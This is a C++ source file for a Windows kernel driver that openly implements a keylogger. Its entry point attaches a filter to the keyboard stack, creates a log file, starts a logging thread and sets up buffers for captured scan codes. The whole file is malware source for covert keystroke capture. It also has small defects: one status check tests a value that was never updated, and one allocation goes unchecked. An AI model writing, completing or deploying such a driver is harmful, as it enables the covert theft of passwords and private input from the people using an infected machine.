#include "KCommon.h"
#include "KKeylogger.h"


extern "C" {

	DRIVER_INITIALIZE
	DriverEntry;

	DRIVER_UNLOAD
	DriverUnload;

	NTSTATUS
	KInitKeylogger(
		PDRIVER_OBJECT
	);
 
}


#ifdef ALLOC_PRAGMA
#pragma alloc_text(INIT, DriverEntry)
#pragma alloc_text(PAGE, DriverUnload)
#pragma alloc_text(INIT, KInitKeylogger)
#endif

 
NTSTATUS
DriverEntry(
	PDRIVER_OBJECT DriverObject,
	PUNICODE_STRING RegistryPath
)
{
	UNREFERENCED_PARAMETER(RegistryPath);

	TRACER();
 
	auto Status = KInitKeylogger(DriverObject);
	if (!NT_SUCCESS(Status)) {
		DbgPrint("[-] 0x%08X : [KInitKeylogger] failed to load!\n", Status);
		return Status;
	}
 
	DriverObject->DriverUnload = [](PDRIVER_OBJECT DriverObj) 
	{
		TRACER();
		KKeylogger::Unload(DriverObj);
	
	};

	return Status;
}

 
NTSTATUS
KInitKeylogger(
	PDRIVER_OBJECT DriverObject
)
{
	TRACER();
	for (size_t i {}; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
		DriverObject->MajorFunction[i] = [](PDEVICE_OBJECT DeviceObj, PIRP Irp)
	{
		return KKeylogger::DummyDispatch(DeviceObj, Irp);
	};

	DriverObject->MajorFunction[IRP_MJ_READ] = KKeylogger::ReadDispatch;

	auto Status = KKeylogger::CreateAttachKeylogger(DriverObject);
	if (!NT_SUCCESS(Status))
		return Status;

	Status = KKeylogger::CreateLogFile(DriverObject);
	if (!NT_SUCCESS(Status)) {
		KKeylogger::Unload(DriverObject);
		return Status;
	}

	KKeylogger::InitializeThreadLogger(DriverObject);
	if (!NT_SUCCESS(Status)) {
		KKeylogger::Unload(DriverObject);
		return Status;
	}
	auto DeviceExt = (KKeylogger::PDEVICE_EXTENSION) DriverObject->DeviceObject->DeviceExtension;

	/* use a lookaside list to keep tabs on the keys entered*/ 
	DeviceExt->LookasideList = (PNPAGED_LOOKASIDE_LIST) ExAllocatePoolWithTag(NonPagedPool,
																			  sizeof(NPAGED_LOOKASIDE_LIST),
																			  KEXP_TAG);
	ExInitializeNPagedLookasideList(DeviceExt->LookasideList,
									nullptr,
									nullptr,
									POOL_NX_ALLOCATION,
									sizeof(KKeylogger::ScanCodes::KEY_CODE_DATA),
									KEXP_TAG,
									0);
	/* for communication w/ the WorkerThread */
	KeInitializeSemaphore(&DeviceExt->SemaphoreLock, 
						  0l, 
						  MAXLONG);

 
	return Status;
}

 
 
 

 

